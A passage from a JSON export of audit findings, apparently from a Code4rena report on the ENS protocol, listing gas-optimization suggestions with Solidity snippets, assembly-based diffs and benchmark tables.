word;\n                 assembly {\n                     word := mload(add(add(data, 32), i))\n                 }\n-                if (i + 32 > data.length) {\n-                    uint256 unused = 256 - (data.length - i) * 8;\n+                if (i + 32 > length) {\n+                    uint256 unused = 256 - (length - i) * 8;\n                     word = (word >> unused) << unused;\n                 }\n                 ac1 +=\n@@ -396,7 +398,8 @@ library RRUtils {\n                     8;\n                 ac2 += (word &\n                     0x00FF00FF00FF00FF00FF00FF00FF00FF00FF00FF00FF00FF00FF00FF00FF00FF);\n-            }\n+                i += 32;\n+            } while (i < data.length + 31);\n             ac1 =\n                 (ac1 &\n                     0x0000FFFF0000FFFF0000FFFF0000FFFF0000FFFF0000FFFF0000FFFF0000FFFF) +\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21915",
      "title": "[G-11] Write a more gas efficient assembly loop",
      "impact": "GAS",
      "content": "In the instance below, we can rewrite the assembly loop using a more gas efficient infinite loop, which performs the condition check at the end of the loop. See [this](https://www.youtube.com/watch?v=ew3pfnb2_V8&t=946s) for more information.\n\nhttps://github.com/code-423n4/2023-04-ens/blob/main/contracts/utils/HexUtils.sol#L44-L58\n\n*Gas Savings for `DNSRegistrar.proveAndClaimWithResolver`, obtained via protocol's tests: Avg 306 gas* \n\n|        |    Min   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  301464  |  339399  |  320432 |    2     |\n| After  |  301158  |  339093  |  320126 |    2     |\n\n```solidity\nFile: contracts/utils/HexUtils.sol\n44:            for {\n45:                let i := idx\n46:            } lt(i, lastIdx) {\n47:                i := add(i, 2)\n48:            } {\n49:                let byte1 := getHex(byte(0, mload(add(ptr, i))))\n50:                let byte2 := getHex(byte(0, mload(add(ptr, add(i, 1)))))\n51:                // if either byte is invalid, set invalid and break loop\n52:                if or(eq(byte1, 0xff), eq(byte2, 0xff)) {\n53:                    valid := false\n54:                    break\n55:                }\n56:                let combined := or(shl(4, byte1), byte2)\n57:                r := or(shl(8, r), combined)\n58:            }\n```\n```diff\ndiff --git a/contracts/utils/HexUtils.sol b/contracts/utils/HexUtils.sol\nindex 3508390..b8579b7 100644\n--- a/contracts/utils/HexUtils.sol\n+++ b/contracts/utils/HexUtils.sol\n@@ -41,11 +41,8 @@ library HexUtils {\n             }\n\n             let ptr := add(str, 32)\n-            for {\n-                let i := idx\n-            } lt(i, lastIdx) {\n-                i := add(i, 2)\n-            } {\n+            let i := idx\n+            for {} 1 {} {\n                 let byte1 := getHex(byte(0, mload(add(ptr, i))))\n                 let byte2 := getHex(byte(0, mload(add(ptr, add(i, 1)))))\n                 // if either byte is invalid, set invalid and break loop\n@@ -55,6 +52,8 @@ library HexUtils {\n                 }\n                 let combined := or(shl(4, byte1), byte2)\n                 r := or(shl(8, r), combined)\n+                i := add(i, 2)\n+                if iszero(lt(i, lastIdx)) { break }\n             }\n         }\n     }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21914",
      "title": "[G-10] Include check in assembly block",
      "impact": "GAS",
      "content": "In the instances below, we can include the checks in the `require` statements inside the following assembly blocks.\n\nTotal Instances: `3`\n\nhttps://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnssec-oracle/BytesUtils.sol#L13-L22\n\n*Gas Savings for `DNSRegistrar.proveAndClaimWithResolver`, obtained via protocol's tests: Avg 1656 gas* \n\n|        |    Min   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  301464  |  339399  |  320432 |    2     |\n| After  |  299808  |  337743  |  318776 |    2     |\n\n```solidity\nFile: contracts/dnssec-oracle/BytesUtils.sol\n13:    function keccak(\n14:        bytes memory self,\n15:        uint256 offset,\n16:        uint256 len\n17:    ) internal pure returns (bytes32 ret) {\n18:        require(offset + len <= self.length);\n19:        assembly {\n20:            ret := keccak256(add(add(self, 32), offset), len)\n21:        }\n22:    }\n```\n```diff\ndiff --git a/contracts/dnssec-oracle/BytesUtils.sol b/contracts/dnssec-oracle/BytesUtils.sol\nindex 96344ce..472c224 100644\n--- a/contracts/dnssec-oracle/BytesUtils.sol\n+++ b/contracts/dnssec-oracle/BytesUtils.sol\n@@ -15,8 +15,10 @@ library BytesUtils {\n         uint256 offset,\n         uint256 len\n     ) internal pure returns (bytes32 ret) {\n-        require(offset + len <= self.length);\n         assembly {\n+            if gt(add(offset, len), mload(self)) {\n+                revert(0, 0)\n+            }\n             ret := keccak256(add(add(self, 32), offset), len)\n         }\n     }\n```\n\nhttps://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnssec-oracle/BytesUtils.sol#L192-L200\n\n*Gas Savings for `DNSRegistrar.proveAndClaimWithResolver`, obtained via protocol's tests: Avg 3795 gas* \n\n|        |    Min   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  301464  |  339399  |  320432 |    2     |\n| After  |  297669  |  335604  |  316637 |    2     |\n\n```solidity\nFile: contracts/dnssec-oracle/BytesUtils.sol\n192:    function readUint16(\n193:        bytes memory self,\n194:        uint256 idx\n195:    ) internal pure returns (uint16 ret) {\n196:        require(idx + 2 <= self.length);\n197:        assembly {\n198:            ret := and(mload(add(add(self, 2), idx)), 0xFFFF)\n199:        }\n200:    }\n```\n```diff\ndiff --git a/contracts/dnssec-oracle/BytesUtils.sol b/contracts/dnssec-oracle/BytesUtils.sol\nindex 96344ce..cd94ece 100644\n--- a/contracts/dnssec-oracle/BytesUtils.sol\n+++ b/contracts/dnssec-oracle/BytesUtils.sol\n@@ -193,8 +193,10 @@ library BytesUtils {\n         bytes memory self,\n         uint256 idx\n     ) internal pure returns (uint16 ret) {\n-        require(idx + 2 <= self.length);\n         assembly {\n+            if gt(add(idx, 2), mload(self)) {\n+                revert(0, 0)\n+            }\n             ret := and(mload(add(add(self, 2), idx)), 0xFFFF)\n         }\n     }\n```\n\nhttps://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnssec-oracle/BytesUtils.sol#L208-L216\n\n*Gas Savings for `DNSRegistrar.proveAndClaimWithResolver`, obtained via protocol's tests: Avg 1449 gas* \n\n|        |    Min   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  301464  |  339399  |  320432 |    2     |\n| After  |  300015  |  337950  |  318983 |    2     |\n\n```solidity\nFile: contracts/dnssec-oracle/BytesUtils.sol\n208:    function readUint32(\n209:        bytes memory self,\n210:        uint256 idx\n211:    ) internal pure returns (uint32 ret) {\n212:        require(idx + 4 <= self.length);\n213:        assembly {\n214:            ret := and(mload(add(add(self, 4), idx)), 0xFFFFFFFF)\n215:        }\n216:    }\n```\n```diff\ndiff --git a/contracts/dnssec-oracle/BytesUtils.sol b/contracts/dnssec-oracle/BytesUtils.sol\nindex 96344ce..e5d3190 100644\n--- a/contracts/dnssec-oracle/BytesUtils.sol\n+++ b/contracts/dnssec-oracle/BytesUtils.sol\n@@ -209,8 +209,10 @@ library BytesUtils {\n         bytes memory self,\n         uint256 idx\n     ) internal pure returns (uint32 ret) {\n-        require(idx + 4 <= self.length);\n         assembly {\n+            if gt(add(idx, 4), mload(self)) {\n+                revert(0, 0)\n+            }\n             ret := and(mload(add(add(self, 4), idx)), 0xFFFFFFFF)\n         }\n     }\n```\n\n**This optimization can also be done for the instances below. However, they are not included in the final Diffs as they do not result in gas savings when the tests are run:**\n\nhttps://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnssec-oracle/BytesUtils.sol#L224-L232\n\nhttps://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnssec-oracle/BytesUtils.sol#L240-L251\n\nhttps://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnssec-oracle/BytesUtils.sol#L260-L271\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21913",
      "title": "[G-09] Use assembly to grab and cast value in byte array",
      "impact": "GAS",
      "content": "Like various similar functions, i.e. [readUint16](https://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnssec-oracle/BytesUtils.sol#L192) and [readUint32](https://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnssec-oracle/BytesUtils.sol#L208), assembly can be used to grab the value at a specified index of a byte array and cast that value to a specific uint type. In the diff below, a check is done before this operation to ensure that the offset is not out of bounds.\n\nhttps://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnssec-oracle/BytesUtils.sol#L179-L184\n\n*Gas Savings for `DNSRegistrar.proveAndClaimWithResolver`, obtained via protocol's tests: Avg 1280 gas* \n\n|        |    Min   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  301464  |  339399  |  320432 |    2     |\n| After  |  300184  |  338119  |  319152 |    2     |\n\n```solidity\nFile: contracts/dnssec-oracle/BytesUtils.sol\n179:    function readUint8(\n180:        bytes memory self,\n181:        uint256 idx\n182:    ) internal pure returns (uint8 ret) {\n183:        return uint8(self[idx]);\n184:    }\n```\n```diff\ndiff --git a/contracts/dnssec-oracle/BytesUtils.sol b/contracts/dnssec-oracle/BytesUtils.sol\nindex 96344ce..8b6335d 100644\n--- a/contracts/dnssec-oracle/BytesUtils.sol\n+++ b/contracts/dnssec-oracle/BytesUtils.sol\n@@ -180,7 +180,12 @@ library BytesUtils {\n         bytes memory self,\n         uint256 idx\n     ) internal pure returns (uint8 ret) {\n-        return uint8(self[idx]);\n+        assembly {\n+            if iszero(lt(idx, mload(self))) {\n+                revert(0, 0)\n+            }\n+            ret := shr(248, mload(add(add(self, 0x20), idx)))\n+        }\n     }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21912",
      "title": "[G-08] Use assembly for loops",
      "impact": "GAS",
      "content": "We can use assembly to write a more gas efficient loop. See the [final diffs](https://gist.github.com/0xJCN/e7523b1e87e79e6eea8e865906e5fb17) for comments regarding the assembly code.\n\nTotal Instances: `3`\n\nhttps://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnssec-oracle/RRUtils.sol#L19-L31\n\n*Gas Savings for `DNSRegistrar.proveAndClaimWithResolver`, obtained via protocol's tests: Avg 9009 gas* \n\n|        |    Min   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  301464  |  339399  |  320432 |    2     |\n| After  |  292455  |  330390  |  311423 |    2     |\n\n```solidity\nFile: contracts/dnssec-oracle/RRUtils.sol\n19:    function nameLength(\n20:        bytes memory self,\n21:        uint256 offset\n22:    ) internal pure returns (uint256) {\n23:        uint256 idx = offset;\n24:        while (true) {\n25:            assert(idx < self.length);\n26:            uint256 labelLen = self.readUint8(idx);\n27:            idx += labelLen + 1;\n28:            if (labelLen == 0) {\n29:                break;\n30:            }\n31:        }\n```\n```diff\ndiff --git a/contracts/dnssec-oracle/RRUtils.sol b/contracts/dnssec-oracle/RRUtils.sol\nindex 20fbf15..2579945 100644\n--- a/contracts/dnssec-oracle/RRUtils.sol\n+++ b/contracts/dnssec-oracle/RRUtils.sol\n@@ -21,12 +21,14 @@ library RRUtils {\n         uint256 offset\n     ) internal pure returns (uint256) {\n         uint256 idx = offset;\n-        while (true) {\n-            assert(idx < self.length);\n-            uint256 labelLen = self.readUint8(idx);\n-            idx += labelLen + 1;\n-            if (labelLen == 0) {\n-                break;\n+        assembly {\n+            for {} 1 {} {\n+                if iszero(lt(idx, mload(self))) {\n+                    revert(0, 0)\n+                }\n+                let labelLen := shr(248, mload(add(add(self, 0x20), idx)))\n+                idx := add(idx, add(labelLen, 1))\n+                if iszero(labelLen) { break }\n             }\n         }\n         return idx - offset;\n```\n\nhttps://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnssec-oracle/RRUtils.sol#L55-L68\n\n*Gas Savings for `DNSRegistrar.proveAndClaimWithResolver`, obtained via protocol's tests: Avg 3216 gas* \n\n|        |    Min   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  301464  |  339399  |  320432 |    2     |\n| After  |  298248  |  336183  |  317216 |    2     |\n\n```solidity\nFile: contracts/dnssec-oracle/RRUtils.sol\n55:    function labelCount(\n56:        bytes memory self,\n57:        uint256 offset\n58:    ) internal pure returns (uint256) {\n59:        uint256 count = 0;\n60:        while (true) {\n61:            assert(offset < self.length);\n62:            uint256 labelLen = self.readUint8(offset);\n63:            offset += labelLen + 1;\n64:            if (labelLen == 0) {\n65:                break;\n66:            }\n67:            count += 1;\n68:        }\n```\n```diff\ndiff --git a/contracts/dnssec-oracle/RRUtils.sol b/contracts/dnssec-oracle/RRUtils.sol\nindex 20fbf15..0cfe57a 100644\n--- a/contracts/dnssec-oracle/RRUtils.sol\n+++ b/contracts/dnssec-oracle/RRUtils.sol\n@@ -57,14 +57,16 @@ library RRUtils {\n         uint256 offset\n     ) internal pure returns (uint256) {\n         uint256 count = 0;\n-        while (true) {\n-            assert(offset < self.length);\n-            uint256 labelLen = self.readUint8(offset);\n-            offset += labelLen + 1;\n-            if (labelLen == 0) {\n-                break;\n+        assembly {\n+            for {} 1 {} {\n+                if iszero(lt(offset, mload(self))) {\n+                    revert(0, 0)\n+                }\n+                let labelLen := shr(248, mload(add(add(self, 0x20), offset)))\n+                offset := add(offset, add(labelLen, 1))\n+                if iszero(labelLen) { break }\n+                count := add(count, 1)\n             }\n-            count += 1;\n         }\n         return count;\n     }\n```\n\nhttps://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnssec-oracle/RRUtils.sol#L259-L270\n\n*Gas Savings for `DNSRegistrar.proveAndClaimWithResolver`, obtained via protocol's tests: Avg 894 gas* \n\n|        |    Min   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  301464  |  339399  |  320432 |    2     |\n| After  |  300570  |  338505  |  319538 |    2     |\n\n```solidity\nFile: contracts/dnssec-oracle/RRUtils.sol\n259:    function isSubdomainOf(\n260:        bytes memory self,\n261:        bytes memory other\n262:    ) internal pure returns (bool) {\n263:        uint256 off = 0;\n264:        uint256 counts = labelCount(self, 0);\n265:        uint256 othercounts = labelCount(other, 0);\n266:\n267:        while (counts > othercounts) {\n268:            off = progress(self, off);\n269:            counts--;\n270:        }\n```\n```diff\ndiff --git a/contracts/dnssec-oracle/RRUtils.sol b/contracts/dnssec-oracle/RRUtils.sol\nindex 20fbf15..8f098f0 100644\n--- a/contracts/dnssec-oracle/RRUtils.sol\n+++ b/contracts/dnssec-oracle/RRUtils.sol\n@@ -263,10 +263,18 @@ library RRUtils {\n         uint256 off = 0;\n         uint256 counts = labelCount(self, 0);\n         uint256 othercounts = labelCount(other, 0);\n-\n-        while (counts > othercounts) {\n-            off = progress(self, off);\n-            counts--;\n+\n+        assembly {\n+            for {} 1 {} {\n+                if iszero(gt(counts, othercounts)) {\n+                    break\n+                }\n+                if iszero(lt(off, mload(self))) {\n+                    revert(0, 0)\n+                }\n+                off := add(add(off, 1), shr(248, mload(add(add(self, 0x20), off))))\n+                counts := sub(counts, 1)\n+            }\n         }\n\n         return self.equals(off, other, 0);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21911",
      "title": "[G-07] Use assembly to make more efficient back-to-back calls",
      "impact": "GAS",
      "content": "In the instance below, two external calls, both of which take two function parameters, are performed. We can potentially avoid memory expansion costs by using assembly to utilize `scratch space` + `free memory pointer` memory offsets for the function calls. We will use the same memory space for both function calls.\n\n**Note: In order to do this optimization safely we will cache the free memory pointer value and restore it once we are done with our function calls.**\n\nhttps://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnsregistrar/DNSRegistrar.sol#L190-L191\n\n*Gas Savings for `DNSRegistrar.proveAndClaimWithResolver`, obtained via protocol's tests: Avg 380 gas* \n\n|        |    Min   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  301464  |  339399  |  320432 |    2     |\n| After  |  301084  |  339019  |  320052 |    2     |\n\n```solidity\nFile: contracts/dnsregistrar/DNSRegistrar.sol\n190:                root.setSubnodeOwner(label, address(this));\n191:                ens.setResolver(node, resolver);\n```\n```diff\ndiff --git a/contracts/dnsregistrar/DNSRegistrar.sol b/contracts/dnsregistrar/DNSRegistrar.sol\nindex 953a9a3..07f8d99 100644\n--- a/contracts/dnsregistrar/DNSRegistrar.sol\n+++ b/contracts/dnsregistrar/DNSRegistrar.sol\n@@ -187,8 +187,26 @@ contract DNSRegistrar is IDNSRegistrar, IERC165 {\n         if (owner == address(0) || owner == previousRegistrar) {\n             if (parentNode == bytes32(0)) {\n                 Root root = Root(ens.owner(bytes32(0)));\n-                root.setSubnodeOwner(label, address(this));\n-                ens.setResolver(node, resolver);\n+                address _resolver = resolver;\n+                ENS _ens = ens;\n+                assembly {\n+                    let memptr := mload(0x40)\n+                    mstore(0x00, 0x8cb8ecec)\n+                    mstore(0x20, label)\n+                    mstore(0x40, address())\n+                    let success1 := call(gas(), root, 0x00, 0x1c, 0x44, 0x00, 0x00)\n+                    if iszero(success1) {\n+                        revert(0, 0)\n+                    }\n+                    mstore(0x00, 0x1896f70a)\n+                    mstore(0x20, node)\n+                    mstore(0x40, _resolver)\n+                    let success2 := call(gas(), _ens, 0x00, 0x1c, 0x44, 0x00, 0x00)\n+                    if iszero(success2) {\n+                        revert(0, 0)\n+                    }\n+                    mstore(0x40, memptr)\n+                }\n             } else {\n                 ens.setSubnodeRecord(\n                     parentNode,\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21910",
      "title": "[G-06] Use assembly to hash values more efficiently",
      "impact": "GAS",
      "content": "In the instances below, we can hash values more efficiently by using the least amount of opcodes possible via assembly.\n\nTotal Instances: `2`\n\nhttps://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnsregistrar/DNSRegistrar.sol#L151\n\n*Gas Savings for `DNSRegistrar.proveAndClaimWithResolver`, obtained via protocol's tests: Avg 116 gas* \n\n|        |    Min   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  301464  |  339399  |  320432 |    2     |\n| After  |  301348  |  339283  |  320316 |    2     |\n\n```solidity\nFile: contracts/dnsregistrar/DNSRegistrar.sol\n151:        bytes32 node = keccak256(abi.encodePacked(parentNode, labelHash));\n```\n```diff\ndiff --git a/contracts/dnsregistrar/DNSRegistrar.sol b/contracts/dnsregistrar/DNSRegistrar.sol\nindex 953a9a3..8fc7456 100644\n--- a/contracts/dnsregistrar/DNSRegistrar.sol\n+++ b/contracts/dnsregistrar/DNSRegistrar.sol\n@@ -147,8 +147,13 @@ contract DNSRegistrar is IDNSRegistrar, IERC165 {\n\n         // Make sure the parent name is enabled\n         parentNode = enableNode(parentName);\n-\n-        bytes32 node = keccak256(abi.encodePacked(parentNode, labelHash));\n+\n+        bytes32 node;\n+        assembly {\n+            mstore(0x00, parentNode)\n+            mstore(0x20, labelHash)\n+            node := keccak256(0x00, 0x40)\n+        }\n         if (!RRUtils.serialNumberGte(inception, inceptions[node])) {\n             revert StaleProof();\n         }\n```\n\nhttps://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnsregistrar/DNSRegistrar.sol#L185\n\n*Gas Savings for `DNSRegistrar.proveAndClaim`, obtained via protocol's tests: Avg 97 gas* \n\n|        |    Min   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  198110  |  308834  |  269704 |    7     |\n| After  |  198025  |  308665  |  269607 |    7     |\n\n```solidity\nFile: contracts/dnsregistrar/DNSRegistrar.sol\n185:        node = keccak256(abi.encodePacked(parentNode, label));\n```\n```diff\ndiff --git a/contracts/dnsregistrar/DNSRegistrar.sol b/contracts/dnsregistrar/DNSRegistrar.sol\nindex 953a9a3..8fc7456 100644\n--- a/contracts/dnsregistrar/DNSRegistrar.sol\n+++ b/contracts/dnsregistrar/DNSRegistrar.sol\n@@ -182,7 +182,11 @@ contract DNSRegistrar is IDNSRegistrar, IERC165 {\n\n         bytes32 parentNode = _enableNode(domain, offset + len + 1);\n         bytes32 label = domain.keccak(offset + 1, len);\n-        node = keccak256(abi.encodePacked(parentNode, label));\n+        assembly {\n+            mstore(0x00, parentNode)\n+            mstore(0x20, label)\n+            node := keccak256(0x00, 0x40)\n+        }\n         address owner = ens.owner(node);\n         if (owner == address(0) || owner == previousRegistrar) {\n             if (parentNode == bytes32(0)) {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21909",
      "title": "[G-05] Refactor code with assembly to check zero address, hash values, and perform external call",
      "impact": "GAS",
      "content": "In the instance below, we can check for the zero address using assembly. In addition, we can reuse memory to hash values and perform an external call.\n\n**Note: In order to do this optimization safely we will cache and restore the free memory pointer.**\n\nhttps://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnsregistrar/DNSRegistrar.sol#L115-L122\n\n*Gas Savings for `DNSRegistrar.proveAndClaimWithResolver`, obtained via protocol's tests: Avg 169 gas* \n\n|        |    Min   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  301464  |  339399  |  320432 |    2     |\n| After  |  301449  |  339077  |  320263 |    2     |\n\n```solidity\nFile: contracts/dnsregistrar/DNSRegistrar.sol\n115:        if (addr != address(0)) {\n116:            if (resolver == address(0)) {\n117:                revert PreconditionNotMet();\n118:            }\n119:            bytes32 node = keccak256(abi.encodePacked(rootNode, labelHash));\n120:            // Set the resolver record\n121:            AddrResolver(resolver).setAddr(node, addr);\n122:        }\n```\n```diff\ndiff --git a/contracts/dnsregistrar/DNSRegistrar.sol b/contracts/dnsregistrar/DNSRegistrar.sol\nindex 953a9a3..a2802fd 100644\n--- a/contracts/dnsregistrar/DNSRegistrar.sol\n+++ b/contracts/dnsregistrar/DNSRegistrar.sol\n@@ -112,13 +112,25 @@ contract DNSRegistrar is IDNSRegistrar, IERC165 {\n             revert PermissionDenied(msg.sender, owner);\n         }\n         ens.setSubnodeRecord(rootNode, labelHash, owner, resolver, 0);\n-        if (addr != address(0)) {\n-            if (resolver == address(0)) {\n-                revert PreconditionNotMet();\n+        assembly {\n+            if iszero(iszero(calldataload(0x64))) {\n+                if iszero(calldataload(0x44)) {\n+                    mstore(0x00, 0xf1613c4c)\n+                    revert(0x1c, 0x04)\n+                }\n+                let memptr := mload(0x40)\n+                mstore(0x00, rootNode)\n+                mstore(0x20, labelHash)\n+                let node := keccak256(0x00, 0x40)\n+                mstore(0x00, 0xd5fa2b00)\n+                mstore(0x20, node)\n+                mstore(0x40, calldataload(0x64))\n+                let success := call(gas(), calldataload(0x44), 0x00, 0x1c, 0x44, 0x00, 0x00)\n+                if iszero(success) {\n+                    revert(0, 0)\n+                }\n+                mstore(0x40, memptr)\n             }\n-            bytes32 node = keccak256(abi.encodePacked(rootNode, labelHash));\n-            // Set the resolver record\n-            AddrResolver(resolver).setAddr(node, addr);\n         }\n     }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21908",
      "title": "[G-04] Avoid emitting storage values",
      "impact": "GAS",
      "content": "In the instance below, we can emit the calldata value instead of emitting a storage value. This will result in using a cheap `CALLDATALOAD` instead of an expensive `SLOAD`.\n\nhttps://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnsregistrar/DNSRegistrar.sol#L80-L83\n\n### Emit `_suffixes` instead of reading from storage\n```solidity\nFile: contracts/dnsregistrar/DNSRegistrar.sol\n80:    function setPublicSuffixList(PublicSuffixList _suffixes) public onlyOwner {\n81:        suffixes = _suffixes;\n82:        emit NewPublicSuffixList(address(suffixes));\n83:    }\n```\n```diff\ndiff --git a/contracts/dnsregistrar/DNSRegistrar.sol b/contracts/dnsregistrar/DNSRegistrar.sol\nindex 953a9a3..64e758f 100644\n--- a/contracts/dnsregistrar/DNSRegistrar.sol\n+++ b/contracts/dnsregistrar/DNSRegistrar.sol\n@@ -79,7 +79,7 @@ contract DNSRegistrar is IDNSRegistrar, IERC165 {\n\n     function setPublicSuffixList(PublicSuffixList _suffixes) public onlyOwner {\n         suffixes = _suffixes;\n-        emit NewPublicSuffixList(address(suffixes));\n+        emit NewPublicSuffixList(address(_suffixes));\n     }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21907",
      "title": "[G-03] Create immutable variable to avoid an external call",
      "impact": "GAS",
      "content": "Instead of performing an external call to get the `root` address each time `_enableNode` is invoked, we can perform this external call once in the constructor and store the `root` as an immutable variable. Doing this will save 1 external call each time `_enableNode` is invoked.\n\nhttps://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnsregistrar/DNSRegistrar.sol#L187-L192\n\n*Gas Savings for `DNSRegistrar.proveAndClaimWithResolver`, obtained via protocol's tests: Avg 1011 gas* \n\n|        |    Min   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  301464  |  339399  |  320432 |    2     |\n| After  |  300453  |  338388  |  319421 |    2     |\n\n```solidity\nFile: contracts/dnsregistrar/DNSRegistrar.sol\n187:        if (owner == address(0) || owner == previousRegistrar) {\n188:            if (parentNode == bytes32(0)) {\n189:                Root root = Root(ens.owner(bytes32(0)));\n190:                root.setSubnodeOwner(label, address(this));\n191:                ens.setResolver(node, resolver);\n192:            } else {\n```\n```diff\ndiff --git a/contracts/dnsregistrar/DNSRegistrar.sol b/contracts/dnsregistrar/DNSRegistrar.sol\nindex 953a9a3..fda3ebc 100644\n--- a/contracts/dnsregistrar/DNSRegistrar.sol\n+++ b/contracts/dnsregistrar/DNSRegistrar.sol\n@@ -28,6 +28,7 @@ contract DNSRegistrar is IDNSRegistrar, IERC165 {\n     PublicSuffixList public suffixes;\n     address public immutable previousRegistrar;\n     address public immutable resolver;\n+    Root private immutable root;\n     // A mapping of the most recent signatures seen for each claimed domain.\n     mapping(bytes32 => uint32) public inceptions;\n\n@@ -65,6 +66,7 @@ contract DNSRegistrar is IDNSRegistrar, IERC165 {\n         suffixes = _suffixes;\n         emit NewPublicSuffixList(address(suffixes));\n         ens = _ens;\n+        root = Root(_ens.owner(bytes32(0)));\n     }\n\n     /**\n@@ -186,7 +188,6 @@ contract DNSRegistrar is IDNSRegistrar, IERC165 {\n         address owner = ens.owner(node);\n         if (owner == address(0) || owner == previousRegistrar) {\n             if (parentNode == bytes32(0)) {\n-                Root root = Root(ens.owner(bytes32(0)));\n                 root.setSubnodeOwner(label, address(this));\n                 ens.setResolver(node, resolver);\n             } else {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-04-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "21906",
      "title": "[G-02] State variables can be cached instead of re-reading them from storage",
      "impact": "GAS",
      "content": "Caching of a state variable replaces each `Gwarmaccess (100 gas)` with a much cheaper stack read.\n\nhttps://github.com/code-423n4/2023-04-ens/blob/main/contracts/dnssec-oracle/DNSSECImpl.sol#L415-L425\n\n*Gas Savings for `DNSRegistrar.proveAndClaim`, obtained via protocol's tests: Avg 182 gas* \n\n|        |    Min   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  198110  |  308834  |  269704 |    7     |\n| After  |  197928  |  308652  |  269522 |    7     |\n\n### Cache `digests[digesttype]` to save 1 SLOAD\n```solidity\nFile: contracts/dnssec-oracle/DNSSECImpl.sol\n415:    function verifyDSHash(\n416:        uint8 digesttype,\n417:        bytes memory data,\n418:        bytes memory digest\n419:    ) internal view returns (bool) {\n420:        if (address(digests[digesttype]) == address(0)) {\n421:            return false;\n422:        }\n423:        return digests[digesttype].verify(data, digest);\n424:    }\n```\n```diff\ndiff --git a/contracts/dnssec-oracle/DNSSECImpl.sol b/contracts/dnssec-oracle/DNSSECImpl.sol\nindex a3e4e5f..df0bbf7 100644\n--- a/contracts/dnssec-oracle/DNSSECImpl.sol\n+++ b/contracts/dnssec-oracle/DNSSECImpl.sol\n@@ -417,9 +417,11 @@ contract DNSSECImpl is DNSSEC, Owned {\n         